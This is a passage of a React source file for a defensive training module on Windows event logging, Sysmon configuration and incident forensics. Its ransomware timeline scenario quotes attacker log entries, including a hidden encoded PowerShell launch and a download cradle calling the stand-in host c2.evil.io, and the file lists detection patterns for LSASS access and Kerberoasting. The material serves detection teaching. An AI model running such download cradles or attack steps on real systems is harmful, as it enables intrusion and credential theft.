{`    </NetworkConnect>`}
{``}
{`    <!-- Event 6: ALL driver loads -->`}
{`    <DriverLoad onmatch="exclude" />`}
{``}
{`    <!-- Event 7: DLL loads from suspicious paths -->`}
{`    <ImageLoad onmatch="include">`}
{`      <ImageLoaded condition="contains">\\Temp\\</ImageLoaded>`}
{`      <ImageLoaded condition="contains">\\AppData\\</ImageLoaded>`}
{`    </ImageLoad>`}
{``}
{`    <!-- Events 10: LSASS access -->`}
{`    <ProcessAccess onmatch="include">`}
{`      <TargetImage condition="is">`}
{`        C:\\Windows\\System32\\lsass.exe</TargetImage>`}
{`    </ProcessAccess>`}
{``}
{`    <!-- Events 19/20/21: ALL WMI subscriptions -->`}
{`    <WmiEvent onmatch="include" />`}
{``}
{`  </EventFiltering>`}
{`</Sysmon>`}
{``}
{`# Community configs (use as starting point):`}
{`# SwiftOnSecurity: github.com/SwiftOnSecurity/sysmon-config`}
{`# Olaf Hartong: github.com/olafhartong/sysmon-modular`}
                </div>
              </div>
              <div>
                <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ LOG SIZE RECOMMENDATIONS</div>
                {[
                  ["Security.evtx", "2 GB minimum. High-traffic DCs may need 4+ GB. Retain 30+ days locally.", C.red],
                  ["System.evtx", "512 MB minimum. Service start/stop, driver events.", C.orange],
                  ["Sysmon/Operational.evtx", "1-2 GB depending on config verbosity. High-value events.", C.cyan],
                  ["PowerShell/Operational.evtx", "1 GB minimum if Script Block Logging enabled. Very verbose.", C.purple],
                  ["TaskScheduler/Operational.evtx", "256 MB. Task creation/execution events.", C.teal],
                  ["WMI-Activity/Operational.evtx", "256 MB. WMI subscription and query events.", C.yellow],
                ].map(([name, desc, c]) => (
                  <div key={name} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>{name}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{desc}</div>
                  </div>
                ))}
                <div style={{ marginTop: "8px" }}>
                  <div style={S.code}>
{`# Set log sizes via GPO:`}
{`# Computer Config → Admin Templates`}
{`# → Windows Components → Event Log Service`}
{`# → Security → Maximum Log Size = 2097152 KB`}
{``}
{`# Or via wevtutil:`}
{`wevtutil sl Security /ms:2147483648  # 2GB`}
{`wevtutil sl Microsoft-Windows-Sysmon/Operational /ms:1073741824`}
                  </div>
                </div>
              </div>
            </div>
          )}

          {monTab === "tools" && (
            <div style={S.grid2}>
              {[
                ["Event Viewer (eventvwr.msc)", "Built-in GUI. Create custom views with XPath filters. Import/export .evtx files. Limited for large-scale investigation.", C.cyan],
                ["Hayabusa", "hayabusa.exe csv-timeline -d /evtx", "Fast EVTX threat hunting tool. 3000+ Sigma-based detection rules. Timeline generation. Logon analysis, lateral movement detection. Rust-based performance.", C.orange],
                ["Chainsaw", "chainsaw hunt -r rules/ --sigma /evtx", "Sigma-native EVTX analysis. Hunt for attack patterns. Timeline correlation. Output: CSV, JSON, ASCII table. Essential DFIR tool.", C.red],
                ["Velociraptor", "artifact: Windows.EventLogs.Evtx", "Agent-based live forensics. Stream event logs from fleet. 1000+ built-in artifacts. Hunt at enterprise scale. Open source.", C.purple],
                ["Splunk + TA-for-Sysmon", "Technology Add-on for Sysmon", "Parse Sysmon fields automatically. Pre-built dashboards. CIM compliance. Essential for Sysmon-based SIEM detection.", C.green],
                ["python-evtx", "python3 -m evtx /path/Security.evtx", "Parse EVTX offline. Validate chunk checksums. Recover deleted records from chunk slack. Forensic-grade parsing.", C.teal],
                ["Plaso / log2timeline", "log2timeline.py timeline.plaso /evidence/", "Multi-format timeline generator. Parses EVTX + NTFS timestamps + Registry + $USNJrnl + prefetch. Super-timeline for DFIR.", C.gold],
                ["Sigma + sigma-cli", "sigma convert -t splunk rules/", "Convert Sigma rules to SIEM queries. 3000+ community rules. MITRE ATT&CK mapped. Automate detection deployment.", C.sky],
              ].map(([t, cmd, d, c]) => (
                <div key={t} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                  <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{t}</div>
                  {cmd && <div style={{ color: C.dim, fontSize: "10px", fontStyle: "italic", marginBottom: "4px" }}>{cmd}</div>}
                  <div style={{ color: C.text, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {monTab === "iocs" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ EVENT LOG IOC MATRIX — HIGH-FIDELITY DETECTION INDICATORS</div>
              <div style={S.grid2}>
                {[
                  ["Event 1102 / 104 — Log cleared", "Security (1102) or System (104) log cleared. Should NEVER happen in production without approved change window. CRITICAL alert, no exceptions.", C.red],
                  ["EventRecordID gap in SIEM sequence", "SIEM sees RecordID 5000 then next is 6500. 1500 events deleted between collection windows. Indicates log tampering after event generation.", C.red],
                  ["EVTX chunk checksum failure", "Parsed EVTX chunk has invalid CRC32. Event data was modified after writing. Definitive evidence of event record tampering.", C.red],
                  ["Event 4624 with no preceding 4688", "Successful logon with no process creation = remote auth only. OR: process creation events were deleted. Correlate against Sysmon Event 1 to verify.", C.orange],
                  ["Sysmon Event 4 — service stopped", "Sysmon service stopped. May indicate attacker disabling monitoring. Correlate with what happened in the gap between stop and restart.", C.red],
                  ["4688 burst then gap", "Many process creations then nothing for hours. Attacker may have disabled process creation audit. Check auditpol output in surrounding events.", C.orange],
                  ["Event 7036 for EventLog stopping", "Windows Event Log service stopped (System log 7036). Outside of planned maintenance = investigate immediately.", C.red],
                  ["High volume of 4625 from single IP", "Brute force. Alert on >10 failures from same IP within 1 minute. Correlate with 4740 (account lockout) and 4624 (eventual success).", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 10: Comparison ── */}
        <PB title="WINDOWS vs LINUX — LOGGING INFRASTRUCTURE COMPARISON" icon="🐧" color={C.cyan}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["logging","collection","forensics","siem"].map(t => (
              <button key={t} style={S.tab(cmpTab === t, C.cyan)} onClick={() => setCmpTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 20px 1fr", gap: "0", alignItems: "start" }}>
            <div style={{ background: "#00101a", border: `1px solid ${C.cyan}22`, borderRadius: "4px", padding: "12px" }}>
              <div style={{ color: C.cyan, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>⊞ WINDOWS</div>
              {cmpTab === "logging" && <>
                <KV k="Primary format" v="EVTX (binary XML) — structured, queryable" kc={C.cyan} />
                <KV k="Log service" v="Windows Event Log (wevtsvc)" kc={C.cyan} />
                <KV k="Telemetry layer" v="ETW (Event Tracing for Windows)" kc={C.cyan} />
                <KV k="Key channels" v="Security, System, Application, Sysmon, PS" kc={C.cyan} />
                <KV k="Audit config" v="Advanced Audit Policy via GPO/auditpol" kc={C.cyan} />
                <KV k="Query tool" v="Get-WinEvent, wevtutil, Event Viewer" kc={C.cyan} />
              </>}
              {cmpTab === "collection" && <>
                <KV k="Central collection" v="Windows Event Forwarding (WEF) native" kc={C.cyan} />
                <KV k="Protocol" v="WinRM / WS-Management (push or pull)" kc={C.cyan} />
                <KV k="Auth" v="Kerberos (domain) or certificate" kc={C.cyan} />
                <KV k="Config" v="GPO deploys subscription to all machines" kc={C.cyan} />
                <KV k="Agent options" v="NXLog, Splunk UF, Elastic Agent, Winlogbeat" kc={C.cyan} />
                <KV k="Extension tool" v="Sysmon (free, Sysinternals)" kc={C.cyan} />
              </>}
              {cmpTab === "forensics" && <>
                <KV k="File format" v="EVTX binary — python-evtx for parsing" kc={C.cyan} />
                <KV k="Record integrity" v="CRC32 per chunk — tampering detectable" kc={C.cyan} />
                <KV k="Deleted records" v="Persist in chunk slack until overwritten" kc={C.cyan} />
                <KV k="Timestamp fields" v="Written (log svc write) + TimeCreated (source)" kc={C.cyan} />
                <KV k="DFIR tool" v="Hayabusa, Chainsaw, Velociraptor, Plaso" kc={C.cyan} />
                <KV k="Timeline" v="log2timeline supports EVTX natively" kc={C.cyan} />
              </>}
              {cmpTab === "siem" && <>
                <KV k="Agent" v="Splunk UF / Elastic Agent / NXLog / Winlogbeat" kc={C.cyan} />
                <KV k="Protocol" v="Proprietary (Splunk) / HTTP/HTTPS (Elastic)" kc={C.cyan} />
                <KV k="Rules" v="Sigma → convert to SIEM query" kc={C.cyan} />
                <KV k="Event enrichment" v="PowerShell field extraction (Properties[])" kc={C.cyan} />
                <KV k="Key events" v="4624,4625,4688,7045,1102,Sysmon 1-26" kc={C.cyan} />
                <KV k="ETW bridge" v="Microsoft Sentinel connects directly to ETW providers" kc={C.cyan} />
              </>}
            </div>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", color: C.dim, fontSize: "18px" }}>⟷</div>
            <div style={{ background: "#0a180a", border: `1px solid ${C.green}22`, borderRadius: "4px", padding: "12px" }}>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>🐧 LINUX</div>
              {cmpTab === "logging" && <>
                <KV k="Primary format" v="Text (syslog RFC 5424) + journald binary" kc={C.green} />
                <KV k="Log service" v="rsyslog / syslog-ng / journald (systemd)" kc={C.green} />
                <KV k="Telemetry layer" v="audit subsystem (auditd) + kernel ftrace/perf" kc={C.green} />
                <KV k="Key sources" v="/var/log/auth.log, syslog, audit.log, kern.log" kc={C.green} />
                <KV k="Audit config" v="auditd rules /etc/audit/rules.d/*.rules" kc={C.green} />
                <KV k="Query tool" v="journalctl, ausearch, grep, awk, jq" kc={C.green} />
              </>}
              {cmpTab === "collection" && <>
                <KV k="Central collection" v="rsyslog forwarding / Filebeat / Fluentd" kc={C.green} />
                <KV k="Protocol" v="syslog UDP/TCP 514 / RELP / TLS encrypted" kc={C.green} />
                <KV k="Auth" v="TLS client certificates (mutual auth best practice)" kc={C.green} />
                <KV k="Config" v="Manual rsyslog config or Ansible/Chef/Puppet" kc={C.green} />
                <KV k="Agent options" v="Filebeat, Fluentd, Vector, NXLog, Splunk UF" kc={C.green} />
                <KV k="Extension tool" v="auditd (kernel audit) + eBPF (modern tracing)" kc={C.green} />
              </>}
              {cmpTab === "forensics" && <>
                <KV k="File format" v="Plain text or journald binary (journalctl -o json)" kc={C.green} />
                <KV k="Record integrity" v="No built-in checksums — text log tampering hard to detect" kc={C.green} />
                <KV k="Deleted records" v="Unlinked file data recoverable from disk (file carving)" kc={C.green} />
                <KV k="Timestamp fields" v="syslog timestamp (host-provided, can be manipulated)" kc={C.green} />
                <KV k="DFIR tool" v="Plaso (syslog+auth.log), Velociraptor, auditd ausearch" kc={C.green} />
                <KV k="Timeline" v="log2timeline supports syslog, auth.log, bash_history" kc={C.green} />
              </>}
              {cmpTab === "siem" && <>
                <KV k="Agent" v="Filebeat / Logstash / Fluentd / Vector" kc={C.green} />
                <KV k="Protocol" v="Elasticsearch HTTP API / Loki Push API / Kafka" kc={C.green} />
                <KV k="Rules" v="Sigma → convert (linux audit rules + syslog)" kc={C.green} />
                <KV k="Event enrichment" v="Logstash grok filter for syslog parsing" kc={C.green} />
                <KV k="Key events" v="auth.log, audit.log (execve, open, connect)" kc={C.green} />
                <KV k="eBPF bridge" v="Falco / Tetragon: kernel-level events via eBPF" kc={C.green} />
              </>}
            </div>
          </div>
        </PB>

        {/* ── 11: Enterprise Scenario ── */}
        <PB title="ENTERPRISE SCENARIO — DFIR: RECONSTRUCT ATTACK TIMELINE FROM LOGS" icon="⚠" color={C.orange} accent={C.orange + "44"}>
          <div style={{ color: C.cyan, fontWeight: "700", marginBottom: "12px", fontSize: "12px" }}>
            🔍 SCENARIO: Post-Incident Timeline Reconstruction — Ransomware Kill Chain from Logs Alone
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ EVENTS COLLECTED BY SIEM (timeline)</div>
              <div style={S.code}>
{`T-6h  4624 Type 3: jsmith@CORP → WKSTN-042`}
{`      Source: VPN gateway IP (normal)`}
{``}
{`T-5h  Sysmon 1: chrome.exe parent=explorer.exe`}
{`      (normal browsing activity)`}
{``}
{`T-4h  Sysmon 1: powershell.exe parent=chrome.exe`}
{`      CmdLine: -nop -w hidden -enc [base64]`}
{`      ← PHISHING CLICK! Chrome spawning PS`}
{``}
{`T-4h  4104: Script Block logged`}
{`      Content: (New-Object Net.WebClient)`}
{`      .DownloadString('https://c2.evil.io/stage2')`}
{``}
{`T-4h  Sysmon 3: powershell.exe → c2.evil.io:443`}
{``}
{`T-3h  4688: cmd.exe parent=powershell.exe`}
{`      CmdLine: net group "Domain Admins" /domain`}
{``}
{`T-2h  4769: Kerberoasting! RC4 TGS for svc_backup`}
{`      (10 SPN requests in 30 seconds)`}
{``}
{`T-1h  Sysmon 10: LSASS accessed`}
{`      Source: powershell.exe GrantedAccess=0x1fffff`}
{``}
{`T+0   Sysmon 11: vssadmin.exe file create`}
{`      (VSS admin tool starting)`}
{`      7036: VSS service started (System log)`}
{``}
{`T+1h  5140: ADMIN$ accessed from 10+ hosts`}
{`      (ransomware spreading via SMB)`}
{``}
{`T+2h  1102: Security log CLEARED on WKSTN-042`}
{`      → Already in SIEM — too late for attacker`}
              </div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DFIR ACTIONS & LOG-BASED FINDINGS</div>
              <div style={S.code}>
{`# Step 1: Collect EVTX from all impacted hosts`}
{`# (SIEM already has forwarded copies)`}
{``}
{`# Step 2: Hayabusa timeline on collected EVTX:`}
{`hayabusa.exe csv-timeline -d C:\\evtx -o timeline.csv`}
{`# → Reveals full kill chain with timestamps`}
{``}
{`# Step 3: Verify Log Integrity`}
{`# Check EventRecordID sequence:`}
{`Get-WinEvent -LogName Security | `}
{`    Select RecordId | Measure  # gap?`}
{`# Gap between 1102 and next event`}
{`# → SIEM has the deleted events anyway!`}
{``}
{`# Step 4: Extract IOCs from 4104 events`}
{`Get-WinEvent -FilterHashtable @{Id=4104} |`}
{`    Where {$_.Properties[2].Value -match "c2.evil"}`}
{`# → c2.evil.io identified as C2 infrastructure`}
{``}
{`# Step 5: Scope lateral movement via Sysmon 3`}
{`# All hosts that connected to c2.evil.io:443`}
{`# All hosts with ADMIN$ access from WKSTN-042`}
{``}
{`# Step 6: Patient zero confirmation`}
{`# Sysmon 1: chrome.exe → powershell.exe`}
{`# 4104: download cradle content`}
{`# Timeline: browser → PS → network = phishing click`}
              </div>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["Why logs survived attacker", "WEF forwarding to SIEM completed before attacker cleared local logs. Even Event 1102 (log clear) was forwarded to SIEM first — so log clear attempt itself became evidence.", C.green],
              ["What Sysmon added", "4688 alone missed: parent process chain, cmdline hash, network connection details, LSASS access mask. Sysmon Events 1,3,10 provided all of this — essential for patient-zero identification.", C.cyan],
              ["Prevention vs detection", "AMSI + Script Block Logging detected the download cradle at T-4h. Real-time SIEM alert should have fired at T-4h (PS → external IP). 4-hour dwell time = alert-to-response process failure, not visibility failure.", C.orange],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#08090d", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 12: Checklist + Summary ── */}
        <PB title="AUDITOR CHECKLIST + SUMMARY" icon="✓" color={C.green}>
          <div style={S.grid2}>
            {[
              [C.red, "Audit Policy — Non-Negotiable", [
                "Advanced Audit Policy active (not legacy Basic Audit) — verify with auditpol /get /category:*",
                "Process Creation audit enabled + command line capture (separate GPO setting)",
                "Logon/Logoff + Account Management + DS Access + Object Access all enabled",
                "Sensitive Privilege Use enabled (SeDebug, SeImpersonate detection)",
                "Audit Policy Change enabled (detect policy tampering — Event 4719)",
              ]],
              [C.orange, "Log Infrastructure", [
                "Security.evtx minimum 2 GB, Sysmon 1 GB, PowerShell/Operational 1 GB",
                "WEF deployed from all critical systems (DCs, servers, workstations) to central WEC",
                "SIEM receives WEF events within <5 minutes of generation",
                "EventRecordID gap detection active in SIEM (gaps alert = deleted events)",
                "Alert on Event 1102 (Security log clear) and 104 (System log clear) — CRITICAL priority",
              ]],
              [C.cyan, "Sysmon Deployment", [
                "Sysmon deployed on 100% of managed endpoints (DC, server, workstation)",
                "Config baseline: Events 1,3,6,7,8,10,11,12,13,15,19,20,21,22,23,25 enabled",
                "SwiftOnSecurity or Olaf Hartong config as starting point",
                "Sysmon version current (check for schema updates quarterly)",
                "Sysmon service restart alert (Event 4 = unexpected stop = attacker activity)",
              ]],
              [C.purple, "SIEM Detection Coverage", [
                "Kerberoasting: Event 4769 RC4 encryption + burst count > 3 per minute",
                "LSASS access: Sysmon Event 10 GrantedAccess 0x10 on lsass = CRITICAL",
                "WMI persistence: Sysmon Events 19+20+21 correlated = CRITICAL",
                "PowerShell abuse: Event 4104 with download cradle patterns",
                "New service outside System32: Event 7045 path filter",
                "DCSync: Event 4662 with replication GUIDs from non-DC source",
              ]],
            ].map(([c, title, items]) => (
              <div key={title} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>▸ {title}</div>
                {items.map(item => (
                  <div key={item} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, fontSize: "11px" }}>☐</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{item}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["Forward before they clear", "WEF forwarding is the single most important log resilience control. Local logs can be cleared, EVTX files deleted, Event Log service stopped — but forwarded events in your SIEM are attacker-proof.", C.red],
              ["Sysmon fills critical logging gaps", "Windows native logging misses: process hashes, PPID, DLL loads, LSASS access details, WMI subscriptions, ADS creation. Sysmon adds all of these. Free tool, massive detection coverage gain.", C.cyan],
              ["EventRecordID = chain of custody", "Every event has a monotonic RecordID. SIEM tracking this sequence provides forensic chain of custody. Gaps are not just evidence gaps — they are evidence OF tampering.", C.orange],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#07080c", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "5px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ color: C.dim, fontSize: "11px" }}>
              <span style={{ color: C.green }}>NEXT MODULE →</span> Step 12: Windows Security Architecture — UAC, Integrity Levels, AppContainer, Sandbox, MIC & Exploit Mitigations
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <Pill c={C.green}>Step 11 Complete</Pill>
              <Pill c={C.teal}>12 Panels · Event Logging Mastered</Pill>
            </div>
          </div>
        </PB>

      </div>
    </div>
  );
}
